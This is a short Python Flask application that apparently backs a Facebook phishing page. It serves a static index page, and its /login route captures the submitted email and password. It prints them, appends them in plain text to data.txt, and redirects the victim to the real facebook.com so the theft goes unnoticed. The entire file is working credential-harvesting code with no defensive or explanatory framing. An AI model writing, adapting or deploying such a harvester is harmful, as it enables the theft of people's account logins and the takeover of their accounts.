from flask import Flask, send_from_directory, request, redirect

app = Flask(__name__)

@app.route("/")
def hello_world():
    return send_from_directory("static", "index.html")

def write_to_file(data):
    with open("data.txt", "a") as file:
        file.write(data + "\n")

@app.route("/login", methods=["POST"])
def login():
    print(request.form)
    email = request.form["email"]
    password = request.form["pass"]
    print("Email:", email)
    print("Password:", password)
    write_to_file(f"Email: {email}, Password: {password}")
    return redirect("https://www.facebook.com/")


if __name__ == "__main__":
    app.run(debug=True)